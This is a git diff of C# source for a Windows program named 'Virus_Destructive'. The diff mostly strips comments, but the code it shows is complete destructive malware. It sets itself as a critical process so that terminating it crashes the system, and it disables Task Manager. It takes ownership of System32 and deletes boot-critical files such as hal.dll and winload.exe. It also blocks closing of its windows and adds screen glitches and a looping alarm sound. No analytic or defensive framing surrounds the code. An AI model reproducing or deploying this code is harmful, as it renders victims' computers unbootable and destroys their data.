@@ -35,17 +35,17 @@ namespace Virus_Destructive
 
         private void Virus_payload_Load(object sender, EventArgs e)
         {
-            int isCritical = 1;  // we want this to be a Critical Process
-            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+            int isCritical = 1;  
+            int BreakOnTermination = 0x1D;  
 
-            Process.EnterDebugMode();  //acquire Debug Privileges
+            Process.EnterDebugMode();  
 
-            // setting the BreakOnTermination = 1 for the current process
+          
             NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
             RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager
+            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); 
 
-            //get system32 folder and drivers
+           
             new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
             tmr1.Start();
             tmr_add.Start();
@@ -55,13 +55,13 @@ namespace Virus_Destructive
         private void tmr1_Tick(object sender, EventArgs e)
         {
             tmr1.Stop();
-            //Path sys files and folders
+           
             string hal_dll = @"C:\Windows\System32\hal.dll";
             string ci_dll = @"C:\Windows\System32\ci.dll";
             string winload_exe = @"C:\Windows\System32\winload.exe";
             string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
 
-            //Delete system files
+           
             if(File.Exists(hal_dll))
             {
                 File.Delete(hal_dll);
@@ -86,7 +86,7 @@ namespace Virus_Destructive
         private void tmr_add_Tick(object sender, EventArgs e)
         {
             tmr_add.Stop();
-            int true_num = r.Next(5); //make random num 1-5
+            int true_num = r.Next(5);
 
             if(true_num == 1)
             {
@@ -204,11 +204,11 @@ namespace Virus_Destructive
         private void tmr_loop_Tick_1(object sender, EventArgs e)
         {
             tmr_loop2.Stop();
-            //this payload make glitchs on your screen :)
+            
             var endWidth = 500;
             var endHeight = 500;
 
-            var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider
+            var scaleFactor = 1; 
 
             var startWidth = endWidth / scaleFactor;
             var startHeight = endHeight / scaleFactor;
@@ -218,7 +218,7 @@ namespace Virus_Destructive
             g = this.CreateGraphics();
             g = Graphics.FromImage(bmp);
 
-            var xPos = Math.Min(0, MousePosition.X - (startWidth / 500)); // divide by two in order to center
+            var xPos = Math.Min(0, MousePosition.X - (startWidth / 500)); 
             var yPos = Math.Min(0, MousePosition.Y - (startHeight / 500));
 
             g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));
@@ -334,7 +334,7 @@ namespace Virus_Destructive
     {
         private SoundPlayer _soundplayer;
 
-        string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; // defined sound
+        string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; 
 
         public Virus_sound()
         {
@@ -349,7 +349,7 @@ namespace Virus_Destructive
 
         private void Virus_sound_FormClosing(object sender, FormClosingEventArgs e)
         {
-            e.Cancel = true; // anti kill
+            e.Cancel = true;
         }
 
         private void Virus_sound_Load(object sender, EventArgs e)
@@ -360,8 +360,8 @@ namespace Virus_Destructive
 
         private void tmr1_Tick(object sender, EventArgs e)
         {
-            tmr1.Stop(); // 300 milisec 
-            _soundplayer.Play(); //play sound
+            tmr1.Stop(); 
+            _soundplayer.Play(); 
             tmr1.Start();
         }
 
